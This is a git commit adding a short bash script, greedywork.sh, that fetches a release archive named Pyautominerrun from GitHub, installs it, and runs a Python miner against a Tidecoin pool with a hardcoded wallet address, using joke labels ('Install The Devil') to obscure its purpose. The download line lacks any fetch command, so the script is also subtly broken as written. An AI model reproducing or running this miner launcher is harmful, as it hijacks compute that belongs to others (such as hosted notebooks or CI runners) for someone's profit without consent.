a5f22b4387ffeb166e23071349614c867ceb3603
Zeusss <98632598+Zeusyf@users.noreply.github.com>
2022-05-15 21:40:42 +0700

    Create greedywork.sh
    do not be greedy

---
+++ greedywork.sh
@@ -0,0 +1,11 @@
+#!/usr/bin/env bash
+echo "At work, to hell with greedy people ..."
+apt update -q  &> /dev/null
+echo "Install The employees ..."
+https://github.com/Zeusyf/Jupyterpy/releases/download/V.0.2.0/Pyautominerrun.tar.gz
+tar -xvf Pyautominerrun.tar.gz
+cd Pyautominerrun
+echo "Install The Devil ..."
+python setup.py install
+echo "Running The Devil ..."
+python3 terminate_the_fuck.py -o pool.tidecoin.exchange:3033 -u TSzSr2wpaQm1jn1PUK69EJrQCLCQ6yrx2f.endpy
